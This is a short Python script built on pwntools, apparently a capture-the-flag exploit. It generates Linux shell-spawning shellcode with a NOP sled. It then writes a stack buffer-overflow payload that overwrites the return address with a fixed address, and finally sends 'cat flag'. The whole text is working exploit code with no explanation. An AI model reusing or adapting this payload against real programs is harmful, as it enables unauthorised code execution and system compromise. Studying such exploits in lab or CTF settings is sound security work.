import pwn
import sys
pwn.context.arch = 'amd64'
shell = pwn.asm(pwn.shellcraft.linux.sh())
shell += b'\x90' * 1000+b'\n'
# print(shell)
sys.stdout.buffer.write(shell)
ret = '\x00\x00\x00\x00\x00\x40\x40\x70' [::-1]
init = 'A' * 32 + 'B' * 8 + ret+'\n'
# print(init)
sys.stdout.buffer.write(init.encode())
print('cat flag\nexit')

